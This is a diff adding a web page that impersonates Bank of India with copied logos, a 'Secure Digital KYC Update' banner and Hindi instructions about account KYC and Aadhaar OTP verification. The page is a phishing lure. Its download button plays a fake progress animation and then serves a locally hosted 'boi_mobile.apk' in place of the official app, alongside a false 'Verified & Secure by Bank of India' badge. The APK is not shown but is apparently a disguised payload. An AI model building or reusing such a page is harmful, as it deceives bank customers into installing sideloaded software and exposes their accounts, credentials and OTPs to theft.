@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of India - Digital KYC Update</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --boi-blue: #003399;
+            --boi-orange: #f37021;
+            --bg-gray: #f2f5f8;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--bg-gray);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .navbar {
+            width: 100%;
+            background: linear-gradient(135deg, #f37021 0%, #00a0e9 50%, #003399 100%);
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            border-bottom: none;
+        }
+
+        .logo-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .boi-mobile-logo {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-bottom: 5px;
+        }
+
+        .boi-text {
+            color: #003399;
+            font-family: 'Arial Black', sans-serif;
+            font-weight: 900;
+            font-size: 32px;
+            line-height: 1;
+        }
+
+        .star-container {
+            position: relative;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .mobile-text {
+            color: #ffffff;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-weight: 700;
+            font-size: 56px;
+            line-height: 1;
+            letter-spacing: -2px;
+            display: flex;
+            align-items: baseline;
+        }
+
+        .mobile-text span {
+            position: relative;
+        }
+
+        /* Red dots in 'o', 'i', and 'e' */
+        .dot-o::after, .dot-i::after, .dot-e::after {
+            content: '';
+            position: absolute;
+            background-color: #ff4d4d;
+            border-radius: 50%;
+        }
+
+        .dot-o::after {
+            width: 10px;
+            height: 10px;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .dot-i::after {
+            width: 8px;
+            height: 8px;
+            left: 50%;
+            top: -12px;
+            transform: translateX(-50%);
+        }
+
+        .dot-e::after {
+            width: 10px;
+            height: 10px;
+            right: -5px;
+            bottom: 5px;
+        }
+
+        .omni-text {
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-style: italic;
+            font-size: 20px;
+            font-weight: 500;
+            margin-top: -5px;
+        }
+
+        .container {
+            width: 92%;
+            max-width: 420px;
+            background: #ffffff;
+            margin-top: 25px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.06);
+        }
+
+        .banner {
+            background: linear-gradient(135deg, var(--boi-blue) 0%, #0051e0 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .banner svg {
+            margin-bottom: 10px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+        }
+
+        .content {
+            padding: 30px 25px;
+        }
+
+        .status-pill {
+            display: inline-block;
+            background: #fff0e6;
+            color: #d35400;
+            padding: 6px 14px;
+            border-radius: 50px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        h2 {
+            color: var(--boi-blue);
+            font-size: 22px;
+            margin: 0 0 15px 0;
+        }
+
+        .hindi-text {
+            color: #444;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .info-box {
+            background: #f8fbff;
+            border-radius: 8px;
+            padding: 15px;
+            border: 1px solid #e1e9f5;
+            margin-bottom: 25px;
+        }
+
+        .info-box b {
+            color: var(--boi-blue);
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .btn-download {
+            display: block;
+            width: 100%;
+            background-color: var(--boi-blue);
+            color: white;
+            text-decoration: none;
+            padding: 18px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 51, 153, 0.2);
+        }
+
+        .btn-download:active {
+            transform: scale(0.97);
+            background-color: #002a80;
+        }
+
+        .security-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 25px;
+            color: #1a8a34;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .footer {
+            margin-top: auto;
+            padding: 30px 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="navbar">
+        <div class="logo-wrapper">
+            <div class="boi-mobile-logo">
+                <div class="boi-text">BOI</div>
+                <div class="star-container">
+                    <svg viewBox="0 0 100 100" width="45" height="45">
+                        <!-- Orange Star with Red Border -->
+                        <path d="M50 5 L61 40 L95 40 L68 60 L78 95 L50 75 L22 95 L32 60 L5 40 L39 40 Z" fill="#f37021" stroke="#cc3300" stroke-width="2"/>
+                        <!-- White Circle in middle -->
+                        <circle cx="50" cy="53" r="10" fill="white" />
+                        <!-- Small figure inside circle (simplified) -->
+                        <circle cx="50" cy="51" r="4" fill="#003399" />
+                        <path d="M46 58 Q50 62 54 58" stroke="#003399" stroke-width="1" fill="none" />
+                    </svg>
+                </div>
+                <div class="mobile-text">
+                    m<span class="dot-o">o</span>b<span class="dot-i">i</span>l<span class="dot-e">e</span>
+                </div>
+            </div>
+            <div class="omni-text">Omni Neo Bank</div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="banner">
+            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            <div style="font-size: 18px; font-weight: 600;">Secure Digital KYC Update</div>
+        </div>
+
+        <div class="content">
+            <div class="status-pill">E-KYC Verification Pending</div>
+            <h2>केवाईसी अपडेट करें</h2>
+
+            <p class="hindi-text">
+                प्रिय ग्राहक, आपके बैंक खाते की सेवाओं को निर्बाध रखने के लिए केवाईसी अपडेट करना आवश्यक है। अब आप इसे घर बैठे <b>BOI Mobile</b> ऐप के माध्यम से कर सकते हैं।
+            </p>
+
+            <div class="info-box">
+                <b>महत्वपूर्ण निर्देश:</b>
+                <div style="font-size: 14px; color: #555;">
+                    • ऐप डाउनलोड करें और लॉगिन करें।<br>
+                    • आधार ओटीपी के जरिए सत्यापन पूरा करें।<br>
+                    • प्रक्रिया में केवल 2-3 मिनट का समय लगेगा।
+                </div>
+            </div>
+
+            <button id="dlBtn" class="btn-download" onclick="handleBOIDownload()">Download BOI Mobile App</button>
+
+            <div class="security-info">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                Verified & Secure by Bank of India
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2023 Bank of India. All rights reserved.<br>
+        Head Office: Star House, C-5, G Block, BKC, Mumbai.
+    </div>
+
+    <script>
+        function handleBOIDownload() {
+            const btn = document.getElementById('dlBtn');
+            btn.disabled = true;
+            btn.style.opacity = "0.7";
+
+            let progress = 0;
+            const step = () => {
+                progress += Math.floor(Math.random() * 15) + 5;
+                if (progress >= 100) {
+                    btn.innerText = "Opening Installer...";
+                    setTimeout(() => {
+                        window.location.href = "boi_mobile.apk";
+                    }, 800);
+                } else {
+                    btn.innerText = "Downloading... " + progress + "%";
+                    setTimeout(step, 200 + Math.random() * 300);
+                }
+            };
+            step();
+        }
+    </script>
+</body>
+</html>
